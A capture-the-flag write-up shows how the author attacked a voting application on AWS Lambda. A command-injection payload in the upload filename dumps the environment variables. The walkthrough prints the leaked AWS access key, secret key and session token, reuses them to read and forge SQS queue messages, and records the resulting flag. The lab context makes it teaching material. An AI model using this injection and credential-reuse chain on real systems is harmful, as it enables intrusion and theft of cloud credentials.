# Democratic decision making strategies are queued up

## Task

![todo](images/05-01.png)

> The Syndicate uses a sophisticated voting application for strategic decision-making and target selection. By
manipulating the application, try to disrupt their decision-making process and gain insights into their operational
plans.

## Solution

The voting application:

![todo](images/05-02.png)

Let's see what happens under the hood when we submit a vote and upload some random PNG file:

![todo](images/05-03.png)

After doing some fuzzing for injection in the `multipart/form-data` fields, we can see that the `filename` field is
vulnerable to command injection and can be used to exfiltrate environment variables of the Lambda function:

![todo](images/05-04.png)

Or simply with `curl`:

```
➜  ~ curl -F "file=@badge.png;filename=\$(env)" https://d5s0pbzlw3.execute-api.us-east-1.amazonaws.com/Prod/api/vote/

{"message":Error putting object: sy-s58790-syndicate-voting-app:2024-02-19-AWS_LAMBDA_FUNCTION_VERSION=$LATEST AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjECcaCXVzLWVhc3QtMSJHMEUCIQCexqEvtoFilSekxvFWedBwhUHplWzP+BX53hqAjtGgcQIgQaTEIQ2bHpkIgvd3NQu8Hk7t85ezXWUnCknt7O91w2oq6AIIEBAAGgw4MTYzNjIxMzk0NjMiDLWg9OCb3+K9vchZMSrFAic7aBoJwl1lTyQ2jGU3ym48ViyDe7DWzqqQmOJ6IEwyxh4vgr8STkG3zvBlres6psLn8uY6bwsJizvcjWYh3XM5j1YwFRo1h7cqT+gXM7BgfwE/YVjatyoXaNaONVG/wkvJpapA4QEGIVRTWuKUt1S8vq8NQSmA8nXzZWJZucJ7C9Vy83Ic7AccCKozPRe5C+/W8pG4cYEOW/spTzp0LgCB3WHDgxj1dbymnHt0a5ZKeHHZmjvfjo95I195IB/Ml6tivnxzgk7Oh90prm0MUDkov4pmV0dbJG6tH/HcUKRLD3x+RtknN4nY6z8PAU1gTSqLgyfy+JVvQa5+yKS9q1S2io+VoSKYQmUGOkdQEkERw8w+FeqnrET4hhM0X48cXjk1/G6TVSYdCXBIloaadbydUrSb6A966Tpo9RuEBKOpXuwq4a4w3PHLrgY6ngHrqhWwo37i4td5H7cXChLWaYgYtkMt9wAAKGuqr/SKPX4fYc+ghLcUP+Lzfq5yyKXRtCrfgjzHhblHqcW0Sv1+r4h4b6xIqUOiA5yh1BwwfrwdEj9Mn+8bT6bqfxxG/TCXdRcHRnzucbPqTL2IQ4yHI+mdQt51K2h6K+bqxVY+yFJWdGJ8tfMZn5dzzorh0ILvB7dWrqOFD/qGEdKsOQ== LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/voting_app LAMBDA_TASK_ROOT=/var/task AWS_LAMBDA_LOG_STREAM_NAME=2024/02/19/[$LATEST]e415d9a2f18f449b8fbe1753c206a37f AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001 AWS_EXECUTION_ENV=AWS_Lambda_nodejs16.x DEST_BUCKET=sy-s58790-syndicate-voting-app AWS_LAMBDA_FUNCTION_NAME=voting_app AWS_XRAY_DAEMON_ADDRESS=169.254.79.129:2000 PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin AWS_DEFAULT_REGION=us-east-1 PWD=/var/task AWS_SECRET_ACCESS_KEY=7bc+4HFKQsG8/teySLCBfobEuUbRnEio50q9sTWV LAMBDA_RUNTIME_DIR=/var/runtime LANG=en_US.UTF-8 AWS_LAMBDA_INITIALIZATION_TYPE=on-demand TZ=:UTC AWS_REGION=us-east-1 NODE_PATH=/opt/nodejs/node16/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task AWS_ACCESS_KEY_ID=ASIA34EXZV5D2UO6XDVV SHLVL=1 _AWS_XRAY_DAEMON_ADDRESS=169.254.79.129 _AWS_XRAY_DAEMON_PORT=2000 API_URL=https://zotdiu8l18.execute-api.us-east-1.amazonaws.com/beta/process _X_AMZN_TRACE_ID=Root=1-65d2fa50-67179be971bd098815a3a09c;Parent=7a28273322081707;Sampled=0;Lineage=23567b9c:0 AWS_XRAY_CONTEXT_MISSING=LOG_ERROR _HANDLER=src/index.handler AWS_LAMBDA_FUNCTION_MEMORY_SIZE=256 SQS_QUEUE_URL=https://sqs.us-east-1.amazonaws.com/816362139463/voting_queue.fifo NODE_EXTRA_CA_CERTS=/var/runtime/ca-cert.pem _=/usr/bin/env
```

These 3 environment variables point to additional AWS services:

```
DEST_BUCKET=sy-s58790-syndicate-voting-app
API_URL=https://zotdiu8l18.execute-api.us-east-1.amazonaws.com/beta/process
SQS_QUEUE_URL=https://sqs.us-east-1.amazonaws.com/816362139463/voting_queue.fifo
```

We can utilize the temporary credentials to get access into the AWS environment:

```
➜  ~ export AWS_ACCESS_KEY_ID=ASIA34EXZV5D2UO6XDVV
➜  ~ export AWS_SECRET_ACCESS_KEY=7bc+4HFKQsG8/teySLCBfobEuUbRnEio50q9sTWV
➜  ~ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjECcaCXVzLWVhc3QtMSJHMEUCIQCexqEvtoFilSekxvFWedBwhUHplWzP+BX53hqAjtGgcQIgQaTEIQ2bHpkIgvd3NQu8Hk7t85ezXWUnCknt7O91w2oq6AIIEBAAGgw4MTYzNjIxMzk0NjMiDLWg9OCb3+K9vchZMSrFAic7aBoJwl1lTyQ2jGU3ym48ViyDe7DWzqqQmOJ6IEwyxh4vgr8STkG3zvBlres6psLn8uY6bwsJizvcjWYh3XM5j1YwFRo1h7cqT+gXM7BgfwE/YVjatyoXaNaONVG/wkvJpapA4QEGIVRTWuKUt1S8vq8NQSmA8nXzZWJZucJ7C9Vy83Ic7AccCKozPRe5C+/W8pG4cYEOW/spTzp0LgCB3WHDgxj1dbymnHt0a5ZKeHHZmjvfjo95I195IB/Ml6tivnxzgk7Oh90prm0MUDkov4pmV0dbJG6tH/HcUKRLD3x+RtknN4nY6z8PAU1gTSqLgyfy+JVvQa5+yKS9q1S2io+VoSKYQmUGOkdQEkERw8w+FeqnrET4hhM0X48cXjk1/G6TVSYdCXBIloaadbydUrSb6A966Tpo9RuEBKOpXuwq4a4w3PHLrgY6ngHrqhWwo37i4td5H7cXChLWaYgYtkMt9wAAKGuqr/SKPX4fYc+ghLcUP+Lzfq5yyKXRtCrfgjzHhblHqcW0Sv1+r4h4b6xIqUOiA5yh1BwwfrwdEj9Mn+8bT6bqfxxG/TCXdRcHRnzucbPqTL2IQ4yHI+mdQt51K2h6K+bqxVY+yFJWdGJ8tfMZn5dzzorh0ILvB7dWrqOFD/qGEdKsOQ==
➜  ~ aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AROA34EXZV5D3X322QQSH:voting_app",
    "Account": "816362139463",
    "Arn": "arn:aws:sts::816362139463:assumed-role/webapp_lambda_role/voting_app"
}
```

The S3 bucket doesn't actually exist. The SQS queue contains a bunch of similar messages that seem to be constantly sent
to the queue:

```
➜  ~ aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/816362139463/voting_queue.fifo --max-number-of-messages 3 --no-cli-pager
{
    "Messages": [
        {
            "MessageId": "84b3fa05-dc03-4758-85c5-0ee0841b49e3",
            "ReceiptHandle": "AQEB68IPdgBIU6E9VbdCfxqZhR9pfYIxe4oA0+tm2vN2WJrtaUAUNmdMygaaUEyrdGyBP8RbUVlfq4rbkKFNDX/pwxF4T18X4b5zyGH2BzjDHdjtXjxM0mf4AiDahcqJSd6I7PkHvypYXju2HyYWjXU9+lkIa445NfpUq8/f8TgidhL3GtCcVTLoOBd0v2h8HP9fOTX08NLFvOZg+0mPB4g89sVk5NjNVpU9lg+SlcCWcDeKK+/iPEjlUvutq1smnrRTjqVNha1tjz+O5GHECBMkg5m8hcJ5MGKXEvOlXAlGvr8=",
            "MD5OfBody": "5e98688c20958e55b8eacc9124d7296b",
            "Body": "{\"message\": {\"email\": \"alex@synd1cat3.org\", \"voteOption\": \"StealthByte Innovations\", \"apiKey\": \"NFZIbE9EQnVZczcyUkZsZzZjeHRDOVN4Z3c5WGsyZDY5RGZQdE5XWA==\"}}"
        },
        {
            "MessageId": "381ad5a0-f3de-4a6b-8449-41fb6f4da357",
            "ReceiptHandle": "AQEB4Q9b3kmSFiCu3xcuSDdj6OsOkokcrE516u58w2nz82BGXYfRtOHL1iaRaL9tCZD0RUjedAa3Vzx+y7YjkHlw8zRaIhY2ZLEWzeONpwUhjgA7WQwSdfq9+SVGPDQMunObTC4Oi4QhMHaZoABBge1L1d5wviPetGO2MEJ9CHocACng17dbvp8Gx981y5iFiOklM/yVIdZ4I2NAFOF/bnxifKn7Hg85jxUSnNP5oiFdZK/NXwY2XnGpTfrhD8OEnItJ6oM5nn1gI7k7DvrNPvtyS5lR2ZE5HSLbmx8sayTSsQI=",
            "MD5OfBody": "5e98688c20958e55b8eacc9124d7296b",
            "Body": "{\"message\": {\"email\": \"alex@synd1cat3.org\", \"voteOption\": \"StealthByte Innovations\", \"apiKey\": \"NFZIbE9EQnVZczcyUkZsZzZjeHRDOVN4Z3c5WGsyZDY5RGZQdE5XWA==\"}}"
        },
        {
            "MessageId": "5cbb8e27-14e9-4298-8bc8-4c2b5f85f249",
            "ReceiptHandle": "AQEBiGaqbLkRpKuz2Z9gwd/Fs4WEvRLFIi4wSokVOd+g9tnXOW/1rrEHnJSomU1aXrZUQfiQdvLPLEzY/gedLhl4PP0UqDarTEuHXHlbDWtAgsyHNG9FpZd2G0j8OHzOI0rYEpdJ2UQAxYsPGdS1XMUbKpziWiNsFMWRpNy9f2TzM2VxgtK6cETXsIRkqzsH/T8ILYHgvc96EggAx34v26ApZT7YULygIa7Tthrx048IfxnO3clup+vzqKV7vi3PEhoYTx87RKHuKbPjkXZ5EJGGoGSLxqujlGLlOjoXaRmw0Nc=",
            "MD5OfBody": "5e98688c20958e55b8eacc9124d7296b",
            "Body": "{\"message\": {\"email\": \"alex@synd1cat3.org\", \"voteOption\": \"StealthByte Innovations\", \"apiKey\": \"NFZIbE9EQnVZczcyUkZsZzZjeHRDOVN4Z3c5WGsyZDY5RGZQdE5XWA==\"}}"
        }
    ]
}
```

If we decode the `apiKey` attribute from the message, we get something that looks like a valid API key:

```
➜  ~ echo NFZIbE9EQnVZczcyUkZsZzZjeHRDOVN4Z3c5WGsyZDY5RGZQdE5XWA== | base64 -d 
4VHlODBuYs72RFlg6cxtC9Sxgw9Xk2d69DfPtNWX
```

Can use it against the API we found earlier in the environment variables, but it is not returning the flag:

```
➜  ~ curl -H "x-api-key: 4VHlODBuYs72RFlg6cxtC9Sxgw9Xk2d69DfPtNWX" https://zotdiu8l18.execute-api.us-east-1.amazonaws.com/beta/process
"Processed Vote Results, 0.95"
```

What seemed to work is sending a vote to the SQS queue for some different organization than the one
`alex@synd1cat3.org` is voting for, and then querying the API:

```
➜  ~ aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/816362139463/voting_queue.fifo --message-body '{"message": {"email": "james@synd1cat3.org", "voteOption": "abc", "apiKey": "NFZIbE9EQnVZczcyUkZsZzZjeHRDOVN4Z3c5WGsyZDY5RGZQdE5XWA=="}}' --message-group-id '1' --message-deduplication-id '1'                                                                                                              
                                       
➜  ~ curl -H "x-api-key: 4VHlODBuYs72RFlg6cxtC9Sxgw9Xk2d69DfPtNWX" https://zotdiu8l18.execute-api.us-east-1.amazonaws.com/beta/process
"Processed Vote Results, 0.05 FLAG{e00944dda958d8554753291d3546048c}
```

The task says something about disrupting the decision-making process, so I guess it kinda makes sense `¯\_(ツ)_/¯`.
